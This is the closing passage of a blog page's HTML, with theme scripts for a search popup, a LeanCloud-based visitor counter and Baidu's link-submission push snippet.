            input.addEventListener('input', inputEventFunction);
          } else {
            $('.search-icon').click(inputEventFunction);
            input.addEventListener('keypress', function (event) {
              if (event.keyCode === 13) {
                inputEventFunction();
              }
            });
          }

          // remove loading animation
          $(".local-search-pop-overlay").remove();
          $('body').css('overflow', '');

          proceedsearch();
        }
      });
    }

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function(e){
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 &&
        $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });
  </script>





  

  
  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
  <script>AV.initialize("RNU69dfOuHjI6UeBMUnrfc9r-gzGzoHsz", "CjUKxBDwv46j3eAbL1XHPmh9");</script>
  <script>
    function showTime(Counter) {
      var query = new AV.Query(Counter);
      var entries = [];
      var $visitors = $(".leancloud_visitors");

      $visitors.each(function () {
        entries.push( $(this).attr("id").trim() );
      });

      query.containedIn('url', entries);
      query.find()
        .done(function (results) {
          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';

          if (results.length === 0) {
            $visitors.find(COUNT_CONTAINER_REF).text(0);
            return;
          }

          for (var i = 0; i < results.length; i++) {
            var item = results[i];
            var url = item.get('url');
            var time = item.get('time');
            var element = document.getElementById(url);

            $(element).find(COUNT_CONTAINER_REF).text(time);
          }
          for(var i = 0; i < entries.length; i++) {
            var url = entries[i];
            var element = document.getElementById(url);
            var countSpan = $(element).find(COUNT_CONTAINER_REF);
            if( countSpan.text() == '') {
              countSpan.text(0);
            }
          }
        })
        .fail(function (object, error) {
          console.log("Error: " + error.code + " " + error.message);
        });
    }

    function addCount(Counter) {
      var $visitors = $(".leancloud_visitors");
      var url = $visitors.attr('id').trim();
      var title = $visitors.attr('data-flag-title').trim();
      var query = new AV.Query(Counter);

      query.equalTo("url", url);
      query.find({
        success: function(results) {
          if (results.length > 0) {
            var counter = results[0];
            counter.fetchWhenSave(true);
            counter.increment("time");
            counter.save(null, {
              success: function(counter) {
                var $element = $(document.getElementById(url));
                $element.find('.leancloud-visitors-count').text(counter.get('time'));
              },
              error: function(counter, error) {
                console.log('Failed to save Visitor num, with error message: ' + error.message);
              }
            });
          } else {
            var newcounter = new Counter();
            /* Set ACL */
            var acl = new AV.ACL();
            acl.setPublicReadAccess(true);
            acl.setPublicWriteAccess(true);
            newcounter.setACL(acl);
            /* End Set ACL */
            newcounter.set("title", title);
            newcounter.set("url", url);
            newcounter.set("time", 1);
            newcounter.save(null, {
              success: function(newcounter) {
                var $element = $(document.getElementById(url));
                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
              },
              error: function(newcounter, error) {
                console.log('Failed to create');
              }
            });
          }
        },
        error: function(error) {
          console.log('Error:' + error.code + " " + error.message);
        }
      });
    }

    $(function() {
      var Counter = AV.Object.extend("Counter");
      if ($('.leancloud_visitors').length == 1) {
        addCount(Counter);
      } else if ($('.post-title-link').length > 1) {
        showTime(Counter);
      }
    });
  </script>



  
<script>
(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
    }
    else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();
</script>


  

  

  

  

</body>
</html>
